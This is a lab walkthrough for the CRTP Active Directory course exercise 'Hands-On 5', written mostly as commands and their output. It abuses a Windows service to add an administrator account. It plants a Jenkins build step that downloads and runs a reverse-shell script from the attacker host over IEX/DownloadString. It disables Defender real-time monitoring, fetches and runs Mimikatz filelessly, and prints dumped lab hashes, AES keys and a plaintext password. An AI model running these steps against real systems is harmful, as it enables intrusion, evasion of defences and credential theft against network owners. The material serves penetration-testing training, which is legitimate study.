CRTP: Hands-On 5

```
  • Exploit a service on dcorp-studentx and elevate privileges to local administrator.
  • Identify a machine in the domain where studentx has local administrative access.
  • Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

Index:

  1. [Exploit Local Service](#exploit-local-service)
  2. [Machine with Local Admin Privs](#machine-with-local-admin-privs)
  3. [Exploit Jenkins](#exploit-jenkins)


## Exploit Local Service

Detect vulnerable service:
```
PS C:\Users\student162> Import-Module C:\AD\Tools\PowerUp.ps1
PS C:\Users\student162> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True

ServiceName    : AbyssWebServer
Path           : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AbyssWebServer' -Path <HijackPath>
CanRestart     : True





[*] Checking service executable and argument permissions...


ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : AbyssWebServer
Path                            : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile                  : C:\WebServer\Abyss Web Server
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AbyssWebServer'
CanRestart                      : True

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False

ServiceName                     : edgeupdatem
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : WriteData/AddFile
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdatem'
CanRestart                      : False





[*] Checking service permissions...


ServiceName   : AbyssWebServer
Path          : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart    : True

ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True





[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\student162\AppData\Local\Microsoft\WindowsApps
IdentityReference : dcorp\student162
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student162\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student162\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....

```
Abuse of local service:
```
 Invoke-ServiceAbuse -Name 'SNMPTRAP'
WARNING: Waiting for service 'SNMP Trap (SNMPTRAP)' to stop...

ServiceAbused Command
------------- -------
SNMPTRAP      net user john Password123! /add && net localgroup Administrators john /add
```

## Machine with Local Admin Privs

Detect machine with local admin access and authenticate as student user of dcorp domain:
```
PS C:\Users\student162> Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Users\student162> Find-PSRemotingLocalAdminAccess
dcorp-adminsrv
PS C:\Users\student162> Enter-PSSession -ComputerName dcorp-adminsrv
[dcorp-adminsrv]: PS C:\Users\student162\Documents> whoami
dcorp\student162
[dcorp-adminsrv]: PS C:\Users\student162\Documents> hostname
dcorp-adminsrv
[dcorp-adminsrv]: PS C:\Users\student162\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7f0c:9f91:b123:91a0%6
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254
```

## Exploit Jenkins

Using browser [http://172.16.3.11:8080]
```
```
Review the users of people page [http://172.16.3.11:8080/asynchPeople/]:

```
  manager	manager	N/A	
  builduser	builduser	N/A	
  jenkinsadmin	jenkinsadmin	N/A
```
Access to jenkins with builduser/builduser [http://172.16.3.11:8080/login?from=/]:

Modify Jenkins Project [http://172.16.3.11:8080/job/Project0/]:
```
Build Stepts --> Execute windows Batch command:

powershell IEX (New-Object Net.WebClient).DownloadString('http://172.16.100.162/Invoke-PowerShellTcp.ps1')

En execute Build Now
```

On the student machine side, it's mandatory listening with two process:
```
The HFS should contains the following script: http://172.16.100.162/Invoke-PowerShellTcp.ps1
On user terminal, It's necesary listne at port 443:

PS C:\Users\student162> powercat -l -p 443

Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins\workspace\Project0>PS C:\Users\Administrator\.jenkins\workspace\Project0>
PS C:\Users\Administrator\.jenkins\workspace\Project0> whoami
dcorp\ciadmin
PS C:\Users\Administrator\.jenkins\workspace\Project0> hostname
dcorp-ci
PS C:\Users\Administrator\.jenkins\workspace\Project0> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e151:2aed:347a:c3cb%5
   IPv4 Address. . . . . . . . . . . : 172.16.3.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.3.254
PS C:\Users\Administrator\.jenkins\workspace\Project0>
```
Dump credentials, with administrator privileges on the dcorp-ci machine:

```
PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-MpPreference -DisableRealTimeMonitoring $true
PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-MpPreference


AllowDatagramProcessingOnWinServer            : False
AllowNetworkProtectionDownLevel               : False
AllowNetworkProtectionOnWinServer             : False
AllowSwitchToAsyncInspection                  : False
AttackSurfaceReductionOnlyExclusions          :
AttackSurfaceReductionRules_Actions           :
AttackSurfaceReductionRules_Ids               :
CheckForSignaturesBeforeRunningScan           : False
CloudBlockLevel                               : 0
CloudExtendedTimeout                          : 0
ComputerID                                    : 7BDCA617-B48B-47A8-A2D1-E20799421B15
ControlledFolderAccessAllowedApplications     :
ControlledFolderAccessProtectedFolders        :
DefinitionUpdatesChannel                      : 0
DisableArchiveScanning                        : False
DisableAutoExclusions                         : False
DisableBehaviorMonitoring                     : False
DisableBlockAtFirstSeen                       : False
DisableCatchupFullScan                        : True
DisableCatchupQuickScan                       : True
DisableCpuThrottleOnIdleScans                 : True
DisableDatagramProcessing                     : False
DisableDnsOverTcpParsing                      : False
DisableDnsParsing                             : False
DisableEmailScanning                          : True
DisableFtpParsing                             : False
DisableGradualRelease                         : False
DisableHttpParsing                            : False
DisableInboundConnectionFiltering             : False
DisableIOAVProtection                         : False
DisableNetworkProtectionPerfTelemetry         : False
DisablePrivacyMode                            : False
DisableRdpParsing                             : False
DisableRealtimeMonitoring                     : True
DisableRemovableDriveScanning                 : True
DisableRestorePoint                           : True
DisableScanningMappedNetworkDrivesForFullScan : True
...

Download fileless Invoke-MimiEx in order to dump lsass process of the target machine:
```
PS C:\Users\Administrator\.jenkins\workspace\Project0> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-MimiEx.ps1")




  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 426948 (00000000:000683c4)
Session           : RemoteInteractive from 2
User Name         : ciadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/28/2023 4:00:37 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1121

         * Username : ciadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879
           rc4_hmac_nt       e08253add90dccf1a208523d02998c3d
           rc4_hmac_old      e08253add90dccf1a208523d02998c3d
           rc4_md4           e08253add90dccf1a208523d02998c3d
           rc4_hmac_nt_exp   e08253add90dccf1a208523d02998c3d
           rc4_hmac_old_exp  e08253add90dccf1a208523d02998c3d

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-CI$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:01 AM
SID               : S-1-5-20

         * Username : dcorp-ci$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       8ec0804e2ed229f58336a750f8627490d3cdcb523de3031acfe4db47fb035073
           rc4_hmac_nt       f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old      f76f48c176dc09cfd5765843c32809f3
           rc4_md4           f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_nt_exp   f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old_exp  f76f48c176dc09cfd5765843c32809f3

Authentication Id : 0 ; 20894 (00000000:0000519e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:01 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-CI$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 6V=+L&GQNU;"au(VO9%jq<_^=F`3JqMC"P!Q0ho[Iq[(Cum]rS%jKK(#-]d-hrI<nB6vVo"DLgEwEY:*c`Q>`3>RCun/3^$rc4N(eEk"$WEtwqZh[8&/KH\t
         * Key List :
           aes256_hmac       e5fe14a5019f866e6618092bd6c29958fdbdaa6f3dabc1bc9f6c42164b16a080
           aes128_hmac       86831a80fa8028ceed42f2fbc93bf94d
           rc4_hmac_nt       f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old      f76f48c176dc09cfd5765843c32809f3
           rc4_md4           f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_nt_exp   f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old_exp  f76f48c176dc09cfd5765843c32809f3

Authentication Id : 0 ; 214205 (00000000:000344bd)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:46:37 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-CI$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 6V=+L&GQNU;"au(VO9%jq<_^=F`3JqMC"P!Q0ho[Iq[(Cum]rS%jKK(#-]d-hrI<nB6vVo"DLgEwEY:*c`Q>`3>RCun/3^$rc4N(eEk"$WEtwqZh[8&/KH\t
         * Key List :
           aes256_hmac       e5fe14a5019f866e6618092bd6c29958fdbdaa6f3dabc1bc9f6c42164b16a080
           aes128_hmac       86831a80fa8028ceed42f2fbc93bf94d
           rc4_hmac_nt       f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old      f76f48c176dc09cfd5765843c32809f3
           rc4_md4           f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_nt_exp   f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old_exp  f76f48c176dc09cfd5765843c32809f3

Authentication Id : 0 ; 56988 (00000000:0000de9c)
Session           : Service from 0
User Name         : ciadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/28/2023 3:44:05 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1121

         * Username : ciadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ContinuousIntrusion123
         * Key List :
           aes256_hmac       1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879
           aes128_hmac       47c59924be154de7483b2efb597d43ae
           rc4_hmac_nt       e08253add90dccf1a208523d02998c3d
           rc4_hmac_old      e08253add90dccf1a208523d02998c3d
           rc4_md4           e08253add90dccf1a208523d02998c3d
           rc4_hmac_nt_exp   e08253add90dccf1a208523d02998c3d
           rc4_hmac_old_exp  e08253add90dccf1a208523d02998c3d

Authentication Id : 0 ; 20861 (00000000:0000517d)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:01 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-CI$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 6V=+L&GQNU;"au(VO9%jq<_^=F`3JqMC"P!Q0ho[Iq[(Cum]rS%jKK(#-]d-hrI<nB6vVo"DLgEwEY:*c`Q>`3>RCun/3^$rc4N(eEk"$WEtwqZh[8&/KH\t
         * Key List :
           aes256_hmac       e5fe14a5019f866e6618092bd6c29958fdbdaa6f3dabc1bc9f6c42164b16a080
           aes128_hmac       86831a80fa8028ceed42f2fbc93bf94d
           rc4_hmac_nt       f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old      f76f48c176dc09cfd5765843c32809f3
           rc4_md4           f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_nt_exp   f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old_exp  f76f48c176dc09cfd5765843c32809f3

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-CI$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/28/2023 3:44:01 AM
SID               : S-1-5-18

         * Username : dcorp-ci$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       8ec0804e2ed229f58336a750f8627490d3cdcb523de3031acfe4db47fb035073
           rc4_hmac_nt       f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old      f76f48c176dc09cfd5765843c32809f3
           rc4_md4           f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_nt_exp   f76f48c176dc09cfd5765843c32809f3
           rc4_hmac_old_exp  f76f48c176dc09cfd5765843c32809f3



```
